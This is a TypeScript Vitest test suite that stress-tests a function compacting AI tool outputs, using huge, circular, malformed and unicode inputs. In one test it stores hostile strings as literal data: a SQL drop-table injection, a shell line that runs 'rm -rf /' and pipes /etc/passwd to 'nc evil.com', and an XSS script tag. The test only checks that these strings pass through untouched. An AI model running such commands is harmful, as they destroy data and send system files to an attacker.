import { describe, expect, it } from "vitest";
import {
  cleanJsonPayload,
  compactToolResult,
  MAX_CLOUDFLARE_RECORDS,
  MAX_FILE_ENTRIES_BEFORE_COMPACT,
  MAX_FILE_SAMPLE_ENTRIES,
  MAX_GENERIC_RESULT_CHARS,
  MAX_GITHUB_ISSUES,
  MAX_GITHUB_REPOS,
  MAX_NOTION_RESULTS,
  MAX_SHELL_OUTPUT_CHARS,
  safelyTruncateJson,
} from "./tool-compacting.js";

describe("Milestone 1 Challenger: Adversarial Stress & Correctness Verification", () => {
  // ==========================================================================
  // 1. EXTREME SCALE STRESS TESTS (100,000 Files, 50MB Shell Outputs)
  // ==========================================================================
  describe("1. Extreme Scale Stress Tests", () => {
    it("1.1 100,000 files list: compacts without OOM or hang, outputs bounded sample and directory summary", () => {
      const startTime = Date.now();
      const files: string[] = [];
      const dirs = ["src/core", "packages/adapters", "packages/contracts", "apps/web", "apps/desktop", "infra/docker"];
      for (let i = 0; i < 100_000; i++) {
        const dir = dirs[i % dirs.length];
        files.push(`${dir}/module_${Math.floor(i / dirs.length)}/file_${i}.ts`);
      }

      const result = compactToolResult("list_files", files);
      const elapsed = Date.now() - startTime;

      expect(typeof result).toBe("string");
      expect(result).toContain("Found 100000 files across directories");
      expect(result).toContain("showing first 30");
      expect(result).toContain("... (+99970 more files)");
      // Verify bounded length: 100k files compressed to small string
      expect(result.length).toBeLessThan(5000);
      expect(elapsed).toBeLessThan(10000); // 100k items must complete under 10s without OOM
    });

    it("1.2 100,000 structured file entries: extracts paths and summarizes without throwing", () => {
      const entries = Array.from({ length: 100_000 }, (_, i) => ({
        path: `packages/pkg_${i % 10}/file_${i}.ts`,
        size: 1024 * (i % 50),
        mtime: 1700000000000 + i,
      }));

      const result = compactToolResult("list_files", { entries });
      expect(result).toContain("Found 100000 files");
      expect(result).toContain("... (+99970 more files)");
      expect(result.length).toBeLessThan(5000);
    });

    it("1.3 50MB raw shell output: truncates to head and tail with exact character count marker", () => {
      const fiftyMBSize = 50 * 1024 * 1024; // 52,428,800 chars
      const headPattern = "=== MONOREPO PIPELINE INITIALIZED ===\n";
      const tailPattern = "\n=== MONOREPO PIPELINE COMPLETED WITH SUCCESS ===";
      const middleChar = "X";
      const middleLength = fiftyMBSize - headPattern.length - tailPattern.length;
      const massiveShell = headPattern + middleChar.repeat(middleLength) + tailPattern;

      expect(massiveShell.length).toBe(fiftyMBSize);

      const startTime = Date.now();
      const result = compactToolResult("shell", massiveShell);
      const elapsed = Date.now() - startTime;

      expect(typeof result).toBe("string");
      expect(result.startsWith(headPattern)).toBe(true);
      expect(result.endsWith(tailPattern)).toBe(true);

      const expectedOmitted = fiftyMBSize - MAX_SHELL_OUTPUT_CHARS;
      expect(result).toContain(`[... ${expectedOmitted} characters truncated ...]`);
      // Bounded output length: 2000 (head) + 2000 (tail) + marker length
      expect(result.length).toBeLessThan(4200);
      expect(elapsed).toBeLessThan(2000);
    });

    it("1.4 50MB structured shell object with stdout and stderr: safely formats and truncates", () => {
      const twentyFiveMB = "S".repeat(25 * 1024 * 1024);
      const shellPayload = {
        stdout: `STDOUT_START\n${twentyFiveMB}\nSTDOUT_END`,
        stderr: `STDERR_START\n${twentyFiveMB}\nSTDERR_END`,
        exitCode: 1,
      };

      const result = compactToolResult("shell", shellPayload);
      expect(typeof result).toBe("string");
      expect(result).toContain("STDOUT_START");
      expect(result).toContain("STDERR_END");
      expect(result).toContain("characters truncated");
      expect(result.length).toBeLessThan(4200);
    });

    it("1.5 50MB non-specialized tool output: safely truncates under MAX_GENERIC_RESULT_CHARS", () => {
      const hugeArray = Array.from({ length: 50_000 }, (_, i) => ({
        id: i,
        name: `Item #${i} descriptive text payload to inflate JSON buffer`,
      }));

      const result = compactToolResult("unregistered_heavy_tool", hugeArray);
      expect(typeof result).toBe("string");
      expect(result.length).toBeLessThanOrEqual(MAX_GENERIC_RESULT_CHARS);
    });
  });

  // ==========================================================================
  // 2. CIRCULAR, DEEPLY NESTED & MALFORMED OBJECTS
  // ==========================================================================
  describe("2. Circular, Deeply Nested & Malformed Objects", () => {
    it("2.1 circular self-referencing object: handles gracefully without uncaught recursion error", () => {
      const circularObj: Record<string, unknown> = { id: 1, name: "circular" };
      circularObj.self = circularObj;

      // Must not throw for any tool
      expect(() => compactToolResult("generic_tool", circularObj)).not.toThrow();
      expect(() => compactToolResult("shell", circularObj)).not.toThrow();
      expect(() => compactToolResult("list_files", circularObj)).not.toThrow();

      const genericOut = compactToolResult("generic_tool", circularObj);
      expect(typeof genericOut).toBe("string");
      expect(genericOut.length).toBeGreaterThan(0);
    });

    it("2.2 mutually circular objects: handles gracefully without stack overflow", () => {
      const a: Record<string, unknown> = { name: "A" };
      const b: Record<string, unknown> = { name: "B" };
      a.partner = b;
      b.partner = a;

      expect(() => compactToolResult("generic_tool", a)).not.toThrow();
      const out = compactToolResult("generic_tool", a);
      expect(typeof out).toBe("string");
    });

    it("2.3 circular array: handles circular arrays gracefully", () => {
      const circularArr: unknown[] = [1, 2];
      circularArr.push(circularArr);

      expect(() => compactToolResult("list_files", circularArr)).not.toThrow();
      expect(() => compactToolResult("generic_tool", circularArr)).not.toThrow();
      const out = compactToolResult("list_files", circularArr);
      expect(typeof out).toBe("string");
    });

    it("2.4 deeply nested object (5,000 levels): handles recursion limit without crashing the process", () => {
      let deep: Record<string, unknown> = { leaf: "deep_value" };
      for (let i = 0; i < 5000; i++) {
        deep = { child: deep };
      }

      expect(() => compactToolResult("generic_tool", deep)).not.toThrow();
      const out = compactToolResult("generic_tool", deep);
      expect(typeof out).toBe("string");
      expect(out.length).toBeLessThanOrEqual(MAX_GENERIC_RESULT_CHARS);
    });

    it("2.5 throwing property getter: catches getter error safely", () => {
      const poisonObj = {
        id: 42,
        get maliciousProperty(): string {
          throw new Error("Adversarial getter detonated!");
        },
      };

      expect(() => compactToolResult("generic_tool", poisonObj)).not.toThrow();
      expect(() => compactToolResult("list_files", [poisonObj])).not.toThrow();
      expect(() => compactToolResult("github_search_repos", [poisonObj])).not.toThrow();
      expect(() => compactToolResult("github_list_issues", [poisonObj])).not.toThrow();
      expect(() => compactToolResult("notion_search", [poisonObj])).not.toThrow();
      expect(() => compactToolResult("cloudflare_list_dns_records", [poisonObj])).not.toThrow();

      const out = compactToolResult("generic_tool", poisonObj);
      expect(typeof out).toBe("string");
    });

    it("2.6 BigInt value: handles BigInt serialization without uncaught TypeError", () => {
      const bigIntPayload = {
        count: 9007199254740991n,
        id: "txn_123",
      };

      expect(() => compactToolResult("generic_tool", bigIntPayload)).not.toThrow();
      const out = compactToolResult("generic_tool", bigIntPayload);
      expect(typeof out).toBe("string");
    });

    it("2.7 Object with throwing toString and toJSON: does not crash caller", () => {
      const explosive = {
        toJSON() {
          throw new Error("toJSON failed");
        },
        toString() {
          throw new Error("toString failed");
        },
      };

      // EMPIRICAL CHALLENGE: This test probes whether compactToolResult is 100% exception safe
      expect(() => compactToolResult("generic_tool", explosive)).not.toThrow();
      expect(() => compactToolResult("shell", explosive)).not.toThrow();
    });

    it("2.8 Malformed JSON strings passed to tools: handles invalid JSON strings without throwing", () => {
      const malformedJson = "{ unclosed json with syntax error: [1, 2, ";
      expect(() => compactToolResult("list_files", malformedJson)).not.toThrow();
      expect(() => compactToolResult("github_search_repos", malformedJson)).not.toThrow();

      const out = compactToolResult("list_files", malformedJson);
      expect(out).toBe(malformedJson);
    });
  });

  // ==========================================================================
  // 3. UNICODE, SURROGATES, CONTROL CHARS & SPECIAL STRINGS
  // ==========================================================================
  describe("3. Unicode, Surrogates, Control Characters & Special Strings", () => {
    it("3.1 Complex Unicode & Emoji combinations: preserves emojis, RTL text, and accent marks", () => {
      const complexUnicode = {
        emojis: "👨‍👩‍👧‍👦 🏳️‍🌈 🔥 🚀 ✨ 🧪",
        arabic: "مرحبا بكم في عالم الذكاء الاصطناعي",
        hebrew: "שלום עולם - בדיקת מערכת",
        cjk: "日本語テキストと中文汉字混合測試",
        accents: "Étude naïve des systèmes à très haute disponibilité et résilience",
      };

      const out = compactToolResult("generic_tool", complexUnicode);
      expect(out).toContain("👨‍👩‍👧‍👦");
      expect(out).toContain("🏳️‍🌈");
      expect(out).toContain("مرحبا بكم");
      expect(out).toContain("שלום עולם");
      expect(out).toContain("日本語テキスト");
      expect(out).toContain("Étude naïve");
    });

    it("3.2 Null bytes and control characters: preserves or safely represents binary characters", () => {
      const controlChars = "Line 1\x00NullByte\x01SOH\x02STX\x1B[31mRedANSI\x1B[0m\tTab\r\nCRLF";
      const out = compactToolResult("shell", controlChars);
      expect(out).toBe(controlChars);
    });

    it("3.3 Lone surrogate pairs: handles unpaired surrogate codepoints without throwing", () => {
      const loneSurrogates = "Unpaired high: \uD800 and low: \uDC00 end";
      expect(() => compactToolResult("generic_tool", { str: loneSurrogates })).not.toThrow();
      expect(() => compactToolResult("shell", loneSurrogates)).not.toThrow();
    });

    it("3.4 100,000 character string without whitespace: safely compacts and truncates", () => {
      const unbrokenString = "X".repeat(100_000);
      const out = compactToolResult("generic_tool", unbrokenString);
      expect(out.length).toBeLessThanOrEqual(MAX_GENERIC_RESULT_CHARS);
      expect(out.endsWith("…")).toBe(true);
    });

    it("3.5 Injection-like payloads: handles SQL, Shell, HTML injection payloads as literal strings", () => {
      const injectionPayload = {
        sql: "'; DROP TABLE users; --",
        shell: "$(rm -rf /) `cat /etc/passwd` | nc evil.com 1337",
        html: "<script>alert('xss')</script><iframe src='javascript:evil()'>",
      };

      const out = compactToolResult("generic_tool", injectionPayload);
      expect(out).toContain("DROP TABLE users");
      expect(out).toContain("$(rm -rf /)");
      expect(out).toContain("<script>alert('xss')</script>");
    });
  });

  // ==========================================================================
  // 4. NIL, EMPTY & TYPE BOUNDARY INPUTS
  // ==========================================================================
  describe("4. Nil, Empty & Type Boundary Inputs", () => {
    const allTools = [
      "list_files",
      "shell",
      "github_search_repos",
      "github_list_issues",
      "notion_search",
      "notion_query_database",
      "cloudflare_list_dns_records",
      "unknown_custom_tool",
      "",
    ];

    it("4.1 null and undefined always return 'ok' across all tools", () => {
      for (const tool of allTools) {
        expect(compactToolResult(tool, null)).toBe("ok");
        expect(compactToolResult(tool, undefined)).toBe("ok");
      }
    });

    it("4.2 empty array [] returns '[]' across all specialized array tools", () => {
      expect(compactToolResult("list_files", [])).toBe("[]");
      expect(compactToolResult("github_search_repos", [])).toBe("[]");
      expect(compactToolResult("github_list_issues", [])).toBe("[]");
      expect(compactToolResult("notion_search", [])).toBe("[]");
      expect(compactToolResult("notion_query_database", [])).toBe("[]");
      expect(compactToolResult("cloudflare_list_dns_records", [])).toBe("[]");
      expect(compactToolResult("generic_tool", [])).toBe("[]");
    });

    it("4.3 empty object {} returns '{}' or empty JSON structure", () => {
      expect(compactToolResult("generic_tool", {})).toBe("{}");
    });

    it("4.4 numeric primitives (0, -0, NaN, Infinity, -Infinity)", () => {
      expect(compactToolResult("generic_tool", 0)).toBe("0");
      expect(compactToolResult("generic_tool", -0)).toBe("0");
      expect(compactToolResult("generic_tool", 42.5)).toBe("42.5");
      expect(compactToolResult("generic_tool", NaN)).toBe("NaN");
      expect(compactToolResult("generic_tool", Infinity)).toBe("Infinity");
      expect(compactToolResult("generic_tool", -Infinity)).toBe("-Infinity");
    });

    it("4.5 boolean primitives (true, false)", () => {
      expect(compactToolResult("generic_tool", true)).toBe("true");
      expect(compactToolResult("generic_tool", false)).toBe("false");
    });

    it("4.6 array of nulls and undefined is filtered by cleanJsonPayload", () => {
      const arrWithNulls = [null, undefined, null];
      const cleaned = cleanJsonPayload(arrWithNulls);
      expect(cleaned).toEqual([]);
    });

    it("4.7 nested objects containing only nulls/undefined collapse to empty/ok", () => {
      const emptyNested = { a: null, b: { c: null, d: undefined } };
      const cleaned = cleanJsonPayload(emptyNested);
      expect(cleaned).toBeUndefined();
      const compacted = compactToolResult("generic_tool", emptyNested);
      expect(compacted).toBe("ok");
    });
  });

  // ==========================================================================
  // 5. MCP CONNECTOR TOOL HANDLER ROBUSTNESS
  // ==========================================================================
  describe("5. MCP Connector Tool Handler Robustness", () => {
    it("5.1 github_search_repos: handles 10,000 repos with missing properties and large star counts", () => {
      const massiveRepos = Array.from({ length: 10_000 }, (_, i) => ({
        id: i,
        name: i % 2 === 0 ? `repo-${i}` : undefined,
        stargazers_count: i === 0 ? 1_000_000 : undefined,
        stars: i === 1 ? 50_000 : undefined,
        language: i % 3 === 0 ? "Rust" : null,
        description: i % 5 === 0 ? "D".repeat(500) : undefined,
      }));

      const out = compactToolResult("github_search_repos", { items: massiveRepos, total_count: 10_000 });
      const parsed = JSON.parse(out);

      expect(parsed.total_count).toBe(10_000);
      expect(parsed.items.length).toBe(MAX_GITHUB_REPOS);
      expect(parsed.items[0]).toContain("repo-0 (1000000⭐, Rust)");
    });

    it("5.2 github_list_issues: handles 10,000 issues with mixed user objects, strings, and missing fields", () => {
      const issues = Array.from({ length: 10_000 }, (_, i) => ({
        id: i,
        number: i + 1,
        title: i % 2 === 0 ? `Issue title ${i}` : undefined,
        state: i % 2 === 0 ? "open" : "closed",
        author: i % 4 === 0 ? `author_${i}` : undefined,
        user: i % 4 === 1 ? { login: `user_obj_${i}` } : i % 4 === 2 ? `user_str_${i}` : null,
      }));

      const out = compactToolResult("github_list_issues", issues);
      const parsed = JSON.parse(out);

      expect(parsed.length).toBe(MAX_GITHUB_ISSUES);
      expect(parsed[0]).toBe("#1 [open] Issue title 0 (@author_0)");
      expect(parsed[1]).toBe("#2 [closed] Untitled (@user_obj_1)");
      expect(parsed[2]).toBe("#3 [open] Issue title 2 (@user_str_2)");
      expect(parsed[3]).toBe("#4 [closed] Untitled (@unknown)");
    });

    it("5.3 notion_search & notion_query_database: handles complex property schemas with empty arrays and missing titles", () => {
      const complexNotion = {
        results: Array.from({ length: 50 }, (_, i) => ({
          id: `notion-page-${i}`,
          object: "page",
          url: `https://notion.so/page-${i}`,
          last_edited_time: "2026-08-22T12:00:00.000Z",
          properties: {
            Name: { type: "title", title: [] }, // empty title
            EmptySelect: { type: "select", select: null },
            Status: { type: "status", status: { name: "Active" } },
            MultiSelect: { type: "multi_select", multi_select: [{ name: "tag1" }, "tag2"] },
            Rating: { type: "number", number: 5 },
            Verified: { type: "checkbox", checkbox: true },
            Schedule: { type: "date", date: { start: "2026-09-01" } },
            ContactEmail: { type: "email", email: "team@rakazo.io" },
            Website: { type: "url", url: "https://rakazo.io" },
          },
        })),
      };

      const out = compactToolResult("notion_query_database", complexNotion);
      const parsed = JSON.parse(out);

      expect(parsed.length).toBe(MAX_NOTION_RESULTS);
      expect(parsed[0].id).toBe("notion-page-0");
      expect(parsed[0].properties.Status).toBe("Active");
      expect(parsed[0].properties.MultiSelect).toEqual(["tag1", "tag2"]);
      expect(parsed[0].properties.Rating).toBe(5);
      expect(parsed[0].properties.Verified).toBe(true);
      expect(parsed[0].properties.Schedule).toBe("2026-09-01");
      expect(parsed[0].properties.ContactEmail).toBe("team@rakazo.io");
      expect(parsed[0].properties.Website).toBe("https://rakazo.io");
    });

    it("5.4 cloudflare_list_dns_records: handles 10,000 records with missing fields and non-standard proxied values", () => {
      const rawRecords = Array.from({ length: 10_000 }, (_, i) => ({
        id: `rec_${i}`,
        type: i % 2 === 0 ? "A" : "AAAA",
        name: `dns-${i}.rakazo.io`,
        content: i % 2 === 0 ? `1.1.1.${i % 255}` : "2606:4700:4700::1111",
        proxied: i % 3 === 0 ? true : i % 3 === 1 ? 1 : false, // boolean / truthy
      }));

      const out = compactToolResult("cloudflare_list_dns_records", { records: rawRecords });
      const parsed = JSON.parse(out);

      expect(parsed.length).toBe(MAX_CLOUDFLARE_RECORDS);
      expect(parsed[0]).toEqual(["A", "dns-0.rakazo.io", "1.1.1.0", true]);
      expect(parsed[1]).toEqual(["AAAA", "dns-1.rakazo.io", "2606:4700:4700::1111", true]);
      expect(parsed[2]).toEqual(["A", "dns-2.rakazo.io", "1.1.1.2", false]);
    });
  });

  // ==========================================================================
  // 6. GLOBAL SAFETY INVARIANTS
  // ==========================================================================
  describe("6. Global Safety Invariants", () => {
    it("6.1 NEVER throws for standard weird input types or primitives", () => {
      const weirdInputs: unknown[] = [
        null,
        undefined,
        0,
        1,
        -1,
        3.14,
        NaN,
        Infinity,
        -Infinity,
        true,
        false,
        "",
        "   ",
        "\0",
        [],
        [null, undefined, 123],
        {},
        { a: 1, b: null },
        new Date(),
        new RegExp("abc"),
        new Map([["k", "v"]]),
        new Set([1, 2, 3]),
        new Error("Test error"),
        () => "function",
        Symbol("sym"),
        9007199254740991n,
      ];

      for (const input of weirdInputs) {
        for (const tool of ["list_files", "shell", "github_search_repos", "github_list_issues", "notion_search", "notion_query_database", "cloudflare_list_dns_records", "custom_mcp_tool"]) {
          let output: string | undefined;
          expect(() => {
            output = compactToolResult(tool, input);
          }).not.toThrow();
          expect(typeof output).toBe("string");
          expect(output).toBeDefined();
        }
      }
    });

    it("6.2 Output is ALWAYS bounded and prevents LLM context overflow", () => {
      const massiveNested = {
        data: Array.from({ length: 1000 }, (_, i) => ({
          id: i,
          nested: {
            sub: Array.from({ length: 50 }, (_, j) => `string_${i}_${j}_${"verbose_text_".repeat(20)}`),
          },
        })),
      };

      const out = compactToolResult("huge_data_tool", massiveNested);
      expect(out.length).toBeLessThanOrEqual(MAX_GENERIC_RESULT_CHARS);
    });
  });
});
